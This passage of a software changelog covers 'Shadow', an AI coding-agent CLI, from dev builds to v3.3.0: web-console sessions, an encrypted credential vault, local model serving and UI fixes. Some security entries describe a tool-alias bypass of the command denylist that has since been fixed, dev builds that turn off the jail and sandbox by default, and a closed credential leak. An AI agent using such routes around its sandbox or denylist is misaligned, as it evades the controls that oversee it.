  or the kernel SIGKILLs the binary (exit 137 / "zsh killed shadow").

## [3.3.0] - 2026-07-21

The `shadow web` console grows from a read-only mirror into a full multi-session
workspace, wrapped in a new design system — plus fixes to two config data-loss paths
and a startup crash.

### Added

- **Multi-session web console.** `shadow web` is now a workspace, not a single mirror:
  many concurrent sessions, each with its own live event stream and status; create,
  switch, drive, and interrupt sessions from the browser. Projects appear as folders
  behind an explicit allowlist — a session only runs in a directory you added on purpose.
- **One-turn-at-a-time run lock.** Exactly one agent turn executes at a time across the
  terminal and every browser session; contention is refused rather than letting two
  agents corrupt one repo. Each web session's agent is built lazily and confined to a
  workspace jail.
- **In-browser management.** View, add, and edit model presets, MCP servers, and
  sub-agent definitions from the console.
- **Shadow Console redesign.** A ground-up visual system — design tokens with
  dark / light / auto theming, a project rail, a session console with live tool cards
  and a composer, and restyled management views. Fully self-contained (no CDN, no remote
  fonts).
- **User-owned system prompt.** A file at `~/.shadow/system_prompt.md`, when present,
  replaces Shadow's built-in identity and instruction modules — you own the whole
  "who you are + how to work" prompt. Shadow keeps only the tool-name preamble and the
  live environment block. An empty file is ignored.

### Fixed

- **Config data-loss: a corrupt `config.json` no longer wipes your endpoints.** A single
  JSON typo used to be read as an empty config, so the next save (model switch, theme
  change, a clean exit) silently overwrote every model preset, credential pointer, and
  MCP server — no error, no backup. A save over an unparseable config now preserves it to
  `config.json.corrupt-<timestamp>` and refuses, instead of annihilating it.
- **Config data-loss: concurrent writes.** Two processes sharing one temp file could
  splice a half-written config into place; each writer now owns a unique temp path.
- **Startup crash on mixed-case credential slots.** A model whose vault-slot id carried
  uppercase (derived from an uppercase model id) failed strict config validation and
  stopped the CLI from starting. The slot-id schema now accepts mixed case; lookups are
  unchanged.
- **Interrupt during an approval.** Esc / Ctrl-C now aborts while a tool approval is
  pending — in the terminal and the browser. Previously the only way out was killing the
  process.

### Changed

- Internals: extracted the agent-session and session-stream builders, a per-server API
  router, and a shared loop-dependency builder; ~15 new test files cover the web server,
  session registry, run lock, jail enforcement, and config atomicity.

## [3.1.0] - 2026-07-18

### Security
- **API keys no longer live in plaintext in `config.json`.** Model presets now store an opaque
  `credRef` pointer; the secret itself lives in the encrypted vault. On first unlock, any preset
  still holding a plaintext `apiKey`/`authToken` is migrated automatically: the key is sealed into
  the vault, the seal is verified by reading it back, a one-time `config.json.pre-credref.bak` is
  written, and only then is the plaintext removed. If the vault is locked, nothing is scrubbed and
  inline keys keep working — Shadow never destroys a key it cannot re-seal.
  *After confirming your models still connect, delete `~/.shadow/config.json.pre-credref.bak` —
  it is a plaintext copy of every migrated key.*
- **Cross-endpoint credential leak closed.** Every custom preset (z.ai, Gemini, Together, local
  vLLM) shares the `openai` adapter, so a missing key used to fall back to the generic adapter key
  or `OPENAI_API_KEY` — sending it to whatever host the preset's `baseUrl` named. A `credRef`
  lookup is now vault-only: a miss fails visibly instead of falling through.
- **A vault and a plaintext `credentials.json` can no longer coexist.** `onboard --web` now shreds
  the plaintext after sealing, and an existing vault adopts any leftover legacy file on unlock
  (vault values win on conflict).
- **Credential rotations are durable.** `saveCredential` re-seals into the vault instead of
  mutating an in-memory copy that was discarded at exit.
- `credRef` joins the untrusted-preset field list, so a project file can never aim your sealed
  credential at its own endpoint.

### Added
- **`shadow web`** — a loopback web UI served from the CLI itself: one process, one port, static
  assets and the live event stream on the same origin. Requests are gated on `Host` (the
  DNS-rebinding defense — loopback binding alone is not one), `Origin`, and a per-session token.
  Server-sent events carry the agent's `LoopEvent` stream, with a replay buffer so a reconnect
  never loses a turn and `shell_output` coalescing so a noisy build can't starve it.

### Changed
- `buildLoopDeps()` replaces three hand-maintained copies of the loop's dependency assembly, so a
  new consumer cannot silently miss a field.
- Retired the unused vendored `ghost-surfer/` Go dashboard (recoverable at `61536f6`).

### Fixed
- Vault tests now hard-fail under any runtime whose `os.homedir()` ignores `process.env.HOME`
  (Bun's does), instead of silently operating on the real `~/.shadow`.

## [3.0.4] - 2026-07-17

### Added
- **Actionable recovery hints on errors.** A provider error now prints a dim `↳ …` line telling you
  what to *do*, not just what failed: a context overflow suggests lowering `maxOutputTokens` /
  `/compact` / a bigger context; a network error points at the endpoint + `/doctor`; auth errors
  point at `shadow onboard` / `/login`; rate-limit, overloaded, timeout, content-filter, and
  bad-model-id each get a distinct next step.

### Fixed
- **Self-recovery from tiny-window context overflows.** When an endpoint rejects the request with
  `max_tokens > max_model_len` (common on small local reasoners / vLLM serves), Shadow's
  shrink-and-retry now floors the output cap at 1024 instead of 4096 — low enough to leave room for
  real input on an 8192-window model — and takes enough attempts to get there, so the run
  self-corrects instead of dying on the first turn.

## [3.0.3] - 2026-07-17

### Added
- **Approval & question dialogs are rebindable.** The approval keys (`y`/`n`/`s`/`f`/`a`) and the
  question-dialog navigation now route through the keybinding resolver, so they can be remapped in
  `~/.shadow/keybindings.json`. The built-in defaults remain as a fall-through, so rebinding only
  ever *adds* chords — it never strands you.
- **Sub-agents render distinctly.** A delegated `agent` tool call now shows `▸ <type> · <description>`
  (in both the live row and the committed transcript) instead of an anonymous `agent(prompt)`, and
  its full answer is a foldable body (`⌄ answer N lines · ^O`) rather than truncated to a one-line gist.
- **Per-task timer.** A turn reports its total wall-clock at the end (`⏺ done · 47s`), paralleling the
  per-tool `(2.3s)` and per-thought `thought for 9s` — for turns that took at least a second.

### Fixed
- **A malformed chart can't crash the transcript.** Chart rendering is now wrapped so a pathological
  (but syntactically valid) spec that hits a geometry edge falls through to a plain code block
  instead of taking down the canvas.

### Removed
- Dead keybinding contexts: `MessageActions` (per-message nav needed the owned viewport that
  collapse-to-stock dropped) and `confirm:previous`/`confirm:next` (a plain approval has no list
  to navigate).

## [3.0.2] - 2026-07-16

### Fixed
- **Provider errors printed twice** — a recoverable provider error (e.g. a bad-`max_tokens` 400, a
  network failure) was emitted to the HUD both when the stream event arrived and again at turn
  cleanup, so every error showed as two identical `! …` lines. The cleanup branch now stops
  without re-emitting; the error surfaces exactly once.

## [3.0.1] - 2026-07-16

### Fixed
- **Local model server not found even when installed** — Shadow spawned `llama-server` (and
  `mlx_lm.server` / `mlx_vlm.server`) by bare name, relying on the PATH it happened to inherit.
  Launched from a context whose PATH omits `~/.local/bin` (a GUI, an IDE, a minimal login shell),
  the lookup failed with `ENOENT` even though the binary was installed — often right next to Shadow
  itself. The resolver now checks the Shadow executable's own directory and the usual local-bins
  (`~/.local/bin`, `/opt/homebrew/bin`, `/usr/local/bin`) before falling back to a PATH lookup, so
  a `llama-server` sitting beside Shadow is always found. Explicit `ggufServer` / `$SHADOW_LLAMA_SERVER`
  paths are unaffected.

## [3.0.0] - 2026-07-16

The "make it beautiful and make it *see*" release. Vision for any model, a multi-model
round-table, a terminal that renders like a product, and three auto-served local backends.

### Added
- **Vision — give any model eyes.** Configure a `vision` endpoint (any OpenAI-compatible VLM you
  host — Ollama / vLLM / llama.cpp) and the driving model gains sight by *delegating*: it calls the
  new `describe_media` tool, Shadow POSTs the image to **your** endpoint and returns the text
  description. A text-only local coder can now read a screenshot, diagram, or chart. The image goes
  only to the vision model you chose; `vision` is a project-untrusted key so a cloned repo can't
  redirect it; the tool is off under `--offline`. See **VISION.md**. (Optional ComfyUI backend for
  boxes that also generate images.)
- **Collaboration Mode — a live model round-table.** `/table <model> <model> …` seats 2–4 models in
  **one shared conversation**; you hold the baton and route each turn with `@handle <question>`,
  `/pass @handle` forwards, `/table done` restores your single model. Each seat's turn is attributed
  with a colored `⏺ handle  provider/model` header. Whitelist-only `@mention` parsing (injection-safe).
- **Terminal charts** — fenced ` ```chart ` / ` ```graph ` / ` ```spark ` blocks render as real
  unicode charts: eighth-block bar charts, braille line graphs, one-row sparklines. Streaming-safe
  (only a closed fence renders; anything unparseable stays a code block). Models are prompted to
  emit the format for trends and comparisons.
- **Two more local backends, auto-served** (joining `.gguf` via llama.cpp):
  - **vLLM served type** (`vllm: <dir|HF-id>`) — Linux + CUDA (safetensors / FP8 / AWQ / GPTQ). Shadow
    launches `vllm serve` (or the vLLM Docker image) with tool-calling enabled and talks to the
    OpenAI endpoint. `shadow local add <dir>` auto-detects a safetensors folder → MLX on Apple, vLLM
    on Linux.
  - **mlx-vlm** — multimodal MLX models on Apple Silicon are auto-detected and served via
    `mlx_vlm.server` (no Docker), alongside the existing text-only `mlx_lm.server` path.
- **Accessible themes** — `/theme colorblind` (Okabe–Ito palette: accents stay distinct under
  deuteranopia, protanopia, and tritanopia; aliases `cb`, `a11y`) and `/theme high-contrast`
  (WCAG AAA; aliases `hc`, `contrast`).
- **Clipboard paste** — `Ctrl+V` pastes from the system clipboard (pbpaste / wl-paste / xclip /
  xsel / PowerShell). `Alt+C` copies the last answer; `/copy code` copies its last fenced code
  block. Copies are secret-redacted before touching the OS clipboard.

### Changed
- **User turns are unmistakable** — a `▌` bar (theme-tinted, new `user` token) runs down every
  line of your prompts, so user entry never blends into answer prose — including multi-line
  prompts, mono/grayscale themes, and any color-vision deficiency. Failed tools mark with a bold
  `✗` (shape, not just a red dot). The assistant `⏺` and spinner follow a new `accent` token.
- **Tables** — rounded `╭╮╰╯` corners (one container family with code blocks), and numeric
  columns under plain `---` separators auto-right-align like a ledger.
- **`/theme` re-themes the transcript** — the flattener now reads a live palette view; previously
  transcript colors froze at startup (the `light` theme rendered unreadable dark-theme gray).
- **No dollar readouts on local models** — `/cost` says "none — local/unpriced model" and
  `/context` drops the `· $…` tail when no real cost accrued (the status strip already did).
- **Slash menu** — fuzzy command matching (`/thm` → `/theme`), argument completion with a
  `✓ current` marker (`/theme ␣`, `/effort ␣`, `/autonomy ␣`, …), did-you-mean on typos,
  alias rows folded from the browse list; `/style` and `/autonomy` now accept a direct argument.

### Fixed
- **Multi-line paste** — bracketed-paste mode makes every paste one atomic insert: embedded
  newlines no longer submit mid-paste, pasted `Tab`/`Esc` no longer trigger menus or interrupts,
  and `\r` line-ends (macOS terminals) normalize instead of garbling the composer and the
  `[Pasted text #N]` chip line counts.
- **Context compaction never loses the task** — the human's instructions are now folded verbatim
  into a delimited block above the summary, so a long session (or a weak local summarizer) can no
  longer make the model forget what it was doing and "start fresh."

## [2.8.1] - 2026-07-11

### Fixed
- **User prompt styling** — the echoed prompt no longer renders as a full-width bold-green block.
  A green `❯` in a 2-col gutter marks the turn (mirroring the assistant's `⏺`), the body renders
  in the quiet dim tier, and every wrapped or typed line hangs under the text — multi-line prompts
  read as one aligned block. Text stays verbatim (no markdown rewrite of what you typed).

## [2.8.0] - 2026-07-11 — "MLX on Apple Silicon"

### Added
- **MLX models on Apple Silicon** — `shadow local add` now takes an MLX model **folder** or an
  `mlx-community/<model>` repo id (one-time HuggingFace download, then fully local) alongside
  `.gguf`. Shadow auto-serves it via `mlx_lm.server` with the same supervision as llama.cpp:
  stderr-captured failures, verified port reuse, install hint (`uv tool install mlx-lm`) when the
  server is missing. Works across `local add/list/test/use/remove`, the first-run mode chooser,
  `/local`, `--offline`, and `doctor --privacy`. Project-file presets cannot set `mlx` (same
  zero-interaction-RCE strip as `gguf`).

## [2.7.0] - 2026-07-11 — "Local First Minutes"

### Added
- **First-run mode chooser** — onboarding opens with the real question: **Local file (.gguf)** /
  **Local server (Ollama · LM Studio · llama.cpp)** / **Cloud**. Local file is a full first-class
  path: enter a `.gguf` path (`~` expands), Shadow registers + activates it and offers a live test —
  no key, no cloud.
- **Model-family profiles v0** — evidence-based per-family defaults with strict precedence
  (explicit config > profile > global default): Anthropic-distilled community models default to the
  anthropic transport with single tool calls; compatibility-matrix verdicts (e.g. GLM-4 NOT-AGENTIC)
  and adapter reasoning floors surface at model selection, when they matter.
- **`THREAT_MODEL.md` (+ designed PDF)** — mechanism → guarantee → limits for every security
  boundary, twelve explicit non-protections, and the platform matrix. Limits get the same
  prominence as guarantees.

### Fixed
- **Local failures now state their cause** — llama-server stderr is captured; port-bind conflicts
  are named with a fix; the health timeout suggests smaller quants / lower `--ctx`.
- **Port reuse is verified** — a server on the model's port must actually serve that model
  (path-like mismatch refuses with guidance; `--alias` servers are reused with a visible note;
  a `/health`-only mystery process is refused instead of silently adopted).
- **Context budgets track the model window** — clamped under the entry's `--ctx` at startup AND on
  mid-session `/model` switches (restored when switching back to cloud); `--ctx` floor is 8192 with
  a compaction heads-up below the 32k default.
- **Pure-local users are no longer bounced into the onboarding wizard on every launch**
  (`needsOnboarding` now recognizes a gguf model as self-sufficient).
- The startup llama.cpp install offer is properly gated (never in `--task` runs; never when the
  entry names its own binary or a server is already up).

### Quality
- The whole Phase-1 diff was adversarially reviewed by a 3-lens verification fleet pre-commit:
  16 confirmed findings (1 blocker) fixed and regression-locked. 736 tests.

## [2.6.0] - 2026-07-11 — "Credentials & Trust"

### Added
- **Encrypted credential vault.** Keys can be sealed in `~/.shadow/vault.enc` with a master password —
  **scrypt (N=2¹⁶) → AES-256-GCM** (authenticated; a wrong password or a tampered file fails to open)
  instead of a plaintext `credentials.json`.
- **Secure browser onboarding** — `shadow onboard --web` opens a self-contained form bound to `127.0.0.1`
  (one-time token, strict CSP that blocks every outbound request) that encrypts your key into the vault.
- **Cross-platform vault unlock** — the derived key is cached in the OS keychain (macOS Keychain / Linux
  libsecret / Windows DPAPI) so the master password is typed once; falls back to `SHADOW_VAULT_PASSWORD`
  (headless/CI) or a masked interactive prompt.
- **Plaintext → vault migration** — the first interactive run offers to encrypt an existing
  `credentials.json` into the vault, then **shreds** the plaintext (overwrite-then-remove).
- **Opt-in update check** (`updateCheck: true`, **off by default**) — at most once a day, a payload-free
  `GET` of the public `package.json` version; prints a one-line notice if a newer release exists. No
  identifiers, usage data, or downloads. Left at the default it makes zero network calls.

- **Multi-provider vaults** — re-running `shadow onboard --web` **merges** the new key into an existing
  vault (unlocks via keychain or master password) instead of overwriting it.
- **`shadow doctor --privacy`** — prove the active config's privacy posture: every egress path (model
  provider, web tools, MCP servers, update check) marked live/inactive, keys-at-rest, offline
  eligibility. Makes **no network calls**; add `--offline` to preview the offline posture.
- **Z.ai (GLM) provider** — "Z.ai (GLM Coding Plan)" in both onboarding paths (terminal + web form),
  defaulting to the GLM coding endpoint with `glm-4.6`.

### Fixed
- **Onboarding is no longer silently overridden** — both onboard paths now clear `lastModel`, so a
  freshly configured provider actually becomes active (previously a stale `/model` pick won at launch).
- **Offline is airtight mid-session** — the opt-in update check is suppressed under `--offline`, and a
  `/model` switch to a cloud endpoint is refused (local models only).
- **Wide markdown tables render as real grids** — columns shrink and cell text wraps within its column;
  the "— row N — / key: value" dump now appears only at genuinely impossible widths.
- **Transcript formatting pack** — nested-bullet indentation preserved; wrapped list items get a hanging
  indent; blockquote `│` repeats on every wrapped row; emoji/CJK-aware table alignment (✅ no longer
  skews borders); table header bold (not the border); link labels in the cyan accent.

### Changed
- `getCredential()` now resolves from the unlocked vault when present, transparently to every caller
  (`resolveApiKey`, provider build, `doctor model`); environment variables still override everything.
- The working spinner is now a circle spinning between light and dark (`◐◓◑◒`) beside `Shadowing…`.

### Docs
- README + USER_GUIDE document the vault, secure onboarding, the privacy doctor, and the opt-in update
  check as one story; `BUILD_PLAN.md` added (post-launch phases 0–4).

---

> **Note on history:** detailed changelog entries were not maintained during the 2.x TUI-parity and
> security sprint. The block below is summarized from the release commits (the shipped source of truth);
> per-change detail lives in `git log`.

## [2.5.4] - 2026-07-01 — security & robustness hardening (pre-promo audit)
- 34-finding adversarial audit closed: autonomy hard-floor, sandbox write-deny for `~/.shadow`, denylist
  redirection quoting, MCP consent as `exec`, ReDoS pre-screen in `grep`, text-tool-call parser hardening,
  and stream/body-shrink retry fixes, among others.

## [2.5.3] - 2026-07-01 — `/goal` no longer spawns the duplicating pinned block.
## [2.5.2] - 2026-07-01 — compaction that resumes the task instead of greeting.
## [2.5.1] - 2026-07-01 — `Shadowing…` status verb + slash-menu contrast.
## [2.5.0] - 2026-07-01 — full reference-client TUI parity (8-rank overhaul).
## [2.0.3] - 2026-06-30 — local GGUF: actionable llama.cpp guidance + offer to install.
## [2.0.0] - 2026-06-30 — softer body type, bright bold tier, duplicate-commit guard; stock renderer.

## [0.9.0-beta.6] - 2026-06-28

### Added
- **`/model` preset management** — switch / list / add / remove / enable / disable model presets from the picker.
- **`/mcp` server management** (list / inspect / enable / disable) and **`/provider`** (active provider, endpoint, auth status, presets).
- New informational commands: **`/onboard` `/session` `/skills` `/workflows` `/plugins` `/tasks`** (and a `/summary` alias for `/compact`).
- Onboarding: back/quit navigation and a context-cooler setup offer.

### Changed
- `prompts/SHADOW.md` "Deliverables are files" strengthened: writing the named file **is** the deliverable; validating logic inline is not a substitute (improves artifact persistence across models — flips a real eval failure).

## [0.9.0-beta.5] - 2026-06-28

### Removed
- **Anthropic `metadata.user_id` reporting** — Shadow no longer derives or sends a per-install identifier; the `installUserId` / `getInstallId` machinery (and the random install id) is gone. Requests carry no persistent user/install metadata. A source-level guard (`test/no-telemetry.test.ts`) keeps it that way.

### Added
- **`/version`** — prints the running Shadow version (also runs mid-turn).
- **Command aliases** via a `dispatch` mechanism: `/keybindings` (→ `/help`), `/output-style` (→ `/style`), `/stats` (→ `/cost`), `/color` (→ `/theme`).

### Changed
- Unified slash-command argument parsing, and the command menu/help now auto-size to the widest command name.

## [0.9.0-beta.4] - 2026-06-28

### Added
- **Multi-question interactive prompts** — the `ask_user_question` overlay now handles multiple questions: navigate with ←/→ or Tab (`N/M` shown), multi-select (`☑`/`☐`) and single-select (`●`/`○`) options toggled with `1`–`9`, and Enter advances through them, then submits on the last.
- **`user_prompt_submit` hook** — configured `user_prompt_submit` hooks run before each turn and can block a prompt (non-zero exit) with the hook's message shown inline.
- **Local `.gguf` auto-serve (ollama-style)** — a model entry with `gguf: "<path>"` makes Shadow launch a `llama.cpp` server for that file on activation and route to it over the OpenAI endpoint; it reuses an already-listening server and shuts down ones it started on exit. Optional `ggufPort` / `ggufArgs` / `ggufServer`, and the context budget is auto-capped under the server's `-c`.

### Fixed
- `/resume <arg>` no longer falls back to the first session when the argument doesn't match (the `endsWith('')` always-true bug).
- Plan-exit approval hint now shows `y/n/a` (the `s`/`f` options were no-ops for a plan approval).

## [0.9.0-beta.3] - 2026-06-28

### Removed
- **`/mouse` command** — removed the mouse-wheel capture toggle. It was unreliable and its SGR mouse-tracking obstructed the view and broke native terminal copy/paste. Mouse scroll and text selection now use the terminal's native behavior at all times.

### Added
- **Collapsible task list** — fold the pinned task list to a one-line header with **Ctrl-T** (`▸ Task list N/M · Ctrl-T`); press again to expand.

### Fixed
- **Reasoning auto-collapse** — when the model moves from thinking to an action (or the final answer arrives), the reasoning block now correctly folds to `▸ Reasoning` instead of expanding.

## [0.7.0-dev.0] - 2026-06-24
_Internal development build — not for release._

### Fixed
- **Composer `o` key** — bare `o` no longer toggles reasoning collapse; use **Ctrl-O** so words like "hello" type normally.
- **TUI flagship options** — interactive sessions now pass `effort`, `cacheTtl`, `fastMode`, and `additionalRoots` to the agent loop (parity with headless/`--task`).
- **Responses reasoning** — `ThinkingSplitter` on the Responses API wire routes inline `<think>`/`<thinking>` to the reasoning channel.

### Added
- **`/fast` slash command** — toggle Anthropic fast mode mid-session.
- **Slash while running** — `/help`, `/cost`, `/usage`, `/context`, `/fast` work without interrupting an active turn.

### Changed
- **README** — documents all 18 slash commands, approval keys (`s`/`f`), multiline composer, Ctrl-O, and expanded harness parity table.

## [0.6.0-dev.23] - 2026-06-24
_Internal development build — not for release._

### Fixed
- **TUI welcome banner** — `fitsWideBanner()` only uses the two-column SHADOW wordmark when both columns fit; fixes right-edge clipping on ~90–110 col terminals.
- **TUI composer** — pinned chrome now reserves live banner rows and flexes the transcript so the `❯` input stays on-screen and accepts keystrokes.

## [0.6.0-dev.22] - 2026-06-23
_Internal development build — not for release._

### Fixed
- **Responses non-stream errors** — `eventsFromResponsesCompletion` now always emits `usage` + `done` after recoverable errors (matches SSE turn shape).

### Added
- **`ResponsesProvider.wire`** — `'responses'` discriminator alongside `name='openai'` for transport logging.
- **ResponsesProvider.send tests** — non-stream fallback + error recovery via real `send()` path; `createProvider` wire selection test.
- **verify:plan** — `SHADOW_WIRE_API=responses` transport + non-stream recovery evidence logs.

## [0.6.0-dev.21] - 2026-06-23
_Internal development build — not for release._

### Fixed
- **Responses non-stream fallback** — `eventsFromResponsesCompletion` parses Responses API JSON (not chat completions); wired as `parseNonStream` on `ResponsesProvider`.
- **Responses SSE dedup** — skip `response.completed` message text when `output_text.delta` events were already streamed.

### Added
- **Responses transport tests** — non-stream fallback via `streamWithRetry`, dedup + envelope parsing (`test/responses-provider.test.ts`).

## [0.6.0-dev.20] - 2026-06-23
_Internal development build — not for release._

### Added
- **`npm run verify:plan`** — `scripts/verify-plan.sh` deterministic driver for M8–M11 verification evidence; self-checking `EVIDENCE-MANIFEST.md` in `{SCRATCH}/implementer`.

## [0.6.0-dev.19] - 2026-06-23
_Internal development build — not for release._

### Added
- **Recovery mock** — `SHADOW_MOCK_RECOVERY=unknown|bad_patch` drives real CLI recovery verification.
- **loop.test** — `unknown_tool` recoverable error coverage.

## [0.6.0-dev.18] - 2026-06-23
_Internal development build — not for release._

### Fixed
- **Dialect eval mock** — `SHADOW_MOCK_DIALECT=1` scripted provider passes dialect fixtures 2/2 under `--mock`.
- **mapUpdatePlan** — `subject` field preserved for `todo_write` schema.

### Added
- **`resolveSystem` module** — exported pure loader for HARNESS_PREAMBLE + AGENTS/CLAUDE ingestion (`test/system-resolve.test.ts`).
- **Responses transport tests** — in-stream error, parallel tool calls, bad_tool_json recovery (`test/responses-provider.test.ts`).

## [0.6.0-dev.17] - 2026-06-23
_Internal development build — not for release._

**M8–M11: TUI hardening + universal harness** (execution order: M8 → M9 → M10 → M11).

### Added
- **M8 TUI** — `computeLayout()` / `formatStatusStrip()`; resize listener; live welcome banner until first turn; StatusStrip above bordered Composer; transcript max-height reserves chrome; pin chrome on real TTY only (`src/tui/layout.ts`; `test/tui-layout.test.ts`).
- **M9 dialect** — `normalizeForeignTool()` adapter: `shell_command`+workdir, command-array `apply_patch`, `update_plan`→`todo_write`, case aliases (`src/tools/foreignAdapter.ts`; `test/foreign-adapter.test.ts`; `eval` dialect fixtures).
- **M10 transport** — Responses API provider + SSE parser; `SHADOW_WIRE_API=responses` selection (`src/provider/responses.ts`; `test/responses-provider.test.ts`).
- **M11 polish** — approve-for-session/prefix in loop + TUI `(s)`/`(f)` keys; live diff panel on edits; harness preamble in system prompt; serialize permission-gated parallel tools (`test/session-approval.test.ts`).

## [0.6.0-dev.16] - 2026-06-23
_Internal development build — not for release._

### Fixed
- **`/permissions` persist layer** — edits write project `shadow.config.json` when present (not only global).
- **Mock headless error path** — `SHADOW_MOCK_ERROR=1` + `--provider mock` emits `provider_error` / `stopped` for CI verification.

## [0.6.0-dev.15] - 2026-06-23
_Internal development build — not for release._

### Fixed
- **`/permissions` edits** — `add`/`remove`/`set`/`clear` subcommands persist rules and hot-update the live loop.
- **Non-stream fallback** — failed fallback no longer suppresses `stream_error` / `idle_timeout` paths (`stream.ts`).
- **Mock headless** — `--task 'print ok'` emits bare `ok` for verification harness.

## [0.6.0-dev.14] - 2026-06-23
_Internal development build — not for release._

**Parity plan Phases B–G + D + A1** (`plans/parity-plan-2.1.185.md`). Phase H (enterprise/cloud) deferred.

### Added
- **Wire protocol (D)** — SSE → non-stream fallback (`src/provider/nonStream.ts`, `stream.ts`); Anthropic lazy block creation on delta; provider error paths tested (`test/non-stream-fallback.test.ts`, `test/anthropic-lazy-block.test.ts`, `test/headless-exit.test.ts`).
- **Chat fidelity (G)** — `reasoning_done` + `finding` loop events; collapsible reasoning + finding cards in TUI; OpenAI `reasoning_content` normalization (`test/chat-fidelity-phase-g.test.ts`, `test/openai-reasoning.test.ts`).
- **Permission depth (B)** — `bashReadOnly.ts` auto-allow for read-only bash; optional AI classifier behind config (`classifier.ts`); Claude-style mode names; `/permissions` slash (`test/bash-readonly.test.ts`, `test/classifier.test.ts`).
- **Session continuity (C)** — context snapshots in JSONL; checkpoints before edit/write; `shadow resume` CLI + `/resume` + `/rewind` (`src/state/{snapshot,checkpoints,resume,rewind}.ts`; `test/resume.test.ts`, `test/checkpoints.test.ts`).
- **Subagents (E)** — agent defs loader (`src/agent/defs.ts`); `subagent_type` honored in `agentTool`; Explore agent prompt (`prompts/agents/explore.md`; `test/agent-defs.test.ts`).
- **Platform (F)** — extended hooks lifecycle; ToolSearch for deferred MCP tools; `ensureShadowLayout()`; `shadow login codex|grok`; slash cmds `/init`, `/agents`, `/usage`, `/memory` (`test/hooks-lifecycle.test.ts`, `test/tool-search.test.ts`).
- **`buildProfile.ts` (A1)** — `DEV_UNRESTRICTED=true` for dev builds; sterile release flips false (`test/build-profile.test.ts`).

### Changed
- **295 tests passing** (1 skipped); lint clean; typecheck + build green.

## [0.6.0-dev.7] - 2026-06-23
_Internal development build — not for release._

**Parity plan Phase A** (`plans/parity-plan-2.1.185.md`).

### Added
- **`shadow doctor` + `/doctor`** — environment diagnostics: Node version, ripgrep, sandbox-tool presence, `~/.shadow` permissions, credentials, provider config, MCP inventory, guardrails mode (`src/doctor.ts`).
- **Parity plan doc** — Shadow vs the reference client phased roadmap with per-phase version tracking.

### Fixed
- **Headless stop visibility** — `attachRenderer` now prints a line for `provider_error`, `fatal_tool_error`, and empty `max_tokens` stops (companion to the existing non-zero exit in `--task` mode).

## [0.6.0-dev.1] - 2026-06-22
_Internal development build — not for release._

Interop work (P0–P2 from the CLI-comparison audit) + this session's features, hardened by a 52-agent code review of the diff (15 confirmed findings, all fixed).

### Added
- **`apply_patch` tool** — the Codex/Grok patch grammar (Add/Update/Delete/Move, `@@` hunks) with fuzzy context matching, applied all-or-nothing, plus text-channel recovery.
- **`/model` picker grouping** — category headers (company / "Local").
- **Subscription-auth scaffold** (`src/auth/`) — import-first; Anthropic excluded by ToS.
- **Tool-name aliases** (`bash`→`run_shell`, …), canonicalized at the gate so the denylist/rules still apply.
- **run_shell**: PID in the HUD + warn when a command (sudo/setsid/nohup/&) may survive ESC.
- HUD `working…` timer shows m/h.

### Changed / Security
- **Dev build is unrestricted by default** (`DEV_UNRESTRICTED`): jail + OS sandbox off so iteration isn't gated — guardrails are a public-release feature (`SHADOW_GUARDRAILS=on` re-enables; `--yolo` always unrestricted).
- Aliased tool calls now **canonicalize `call.name`** so the catastrophic-command denylist + permission rules apply (fixed an alias-bypass found in review).
- OpenAI cached tokens are **disjoint** from input (no cost/context double-count); reasoning models send `max_completion_tokens` + `reasoning_effort`; model fallback fires on in-band error frames; Anthropic in-flight `tool_use` flush; id-aware tool-call keying.
- `AGENTS.md`/`CLAUDE.md` ingested as size-capped, strongly-framed **untrusted** data.

## [0.6.0-dev.0] - 2026-06-22
_Internal development build — not for release. **Minor bump: format-adaptive milestone (M7), pushing toward v1.0.**_

Closes the **format-adaptive universality** push (dev.20–dev.24) and the model-compatibility test program, and ships a real bug fix found in that testing.

### Fixed
- **`grep` accepts a single FILE path, not just a directory.** Pointing `grep` at a file (`path: "server.log"`) previously returned `not_a_directory`, even though the schema advertises "Directory (or file)". It now `stat`s the target and, when it's a file, scans just that file (binary/size-guarded, line-clamped) — matching how models and people naturally run `grep pattern file`. Directory search is unchanged. (`src/tools/grep.ts`; covered by `test/grep-file.test.ts`.)

### Added
- **Model-compatibility leaderboard in the README** — 9 models scored across the 50-prompt breadth suite and the execute-the-artifact "hard" suite, with full upstream model IDs. Frames the project honestly: **for agentic, tool-calling models over the wire format they were trained for** — not "any model."

### Milestone — format-adaptive universality (M7), rolled up
The work landed incrementally in dev.20–dev.24; this is the summary of what now ships:
- **Text-embedded tool-call recovery** (dev.20) — recovers `<tool_call>…</tool_call>`, `call:NAME{…}`, `{"tool_calls":[…]}`, `{"writables":[…]}` envelopes emitted as assistant *text* into real calls; envelope-only by design (a ```python/```shell block is never auto-executed — a correctness + security boundary).
- **Control/template-token scrub** (dev.20) — strips leaked `</think>`, `<channel|>`, `<tool_call|>`, and the ChatML `<|…|>` family from committed answers (deterministic: 7→0 leaks on the worst model).
- **Transport auto-detect at onboarding** (dev.21) — a Claude/Opus-distilled model name on the OpenAI transport prompts a switch to the Anthropic transport (the format it was trained for). Heuristic, suggests-never-forces.
- **Onboarding redesign + scope disclaimer** (dev.22–dev.23) — centered SHADOW banner, boxed disclaimer stating Shadow is for agentic models (a chat model won't call tools), `The_Red_Pill (coming soon)` placeholder pointing nowhere.
- **Three tool-call signature regimes, all round-tripped** — Anthropic signed thinking, **Gemini `thought_signature`** (dev.24), and plain OpenAI.

**Test program findings (9 models):** a clean tool-caller (e.g. base Gemma 4 12B at 94%, or a local model's uncensored builds at 10/10 hard) gives a strong local agent. The three failures are *distinct*: **FORMAT** (Opus-distilled Gemma — harness-addressable; same family base scores 9×), **CAPABILITY** (GLM-4.7-Flash — not addressable), and **NOT AGENTIC** (GLM-4 chat model — out of scope). Clean uncensoring preserves capability; botched distillation/quant is what breaks models.

## [0.5.0-dev.24] - 2026-06-22
_Internal development build — not for release._

### Fixed
- **Gemini multi-turn tool use (OpenAI-compat).** Gemini returns a `thought_signature` on each tool call (`tool_calls[].extra_content.google.thought_signature`) that **must be echoed back** on the next request, or the second turn 400s (`Function call is missing a thought_signature`). The OpenAI adapter now captures it from the stream, carries it on the tool-use block, and replays it in `toOpenAIMessages` — mirroring the Anthropic signed-block round-trip. Enables Gemini (and any provider using this field) for real multi-step agentic loops, not just single tool calls.

## [0.5.0-dev.23] - 2026-06-22
_Internal development build — not for release._

### Changed
- **Onboarding disclaimer is explicit about scope:** Shadow is for **agentic (tool-calling) models** — a chat-only model will reply but **won't call tools and isn't intended to work** in the CLI. (Grounded in testing: a chat model narrates *"I will use the write_file tool…"* but emits zero tool calls.) Also notes capability/format vary by model and each performs best on the wire format it was trained for.

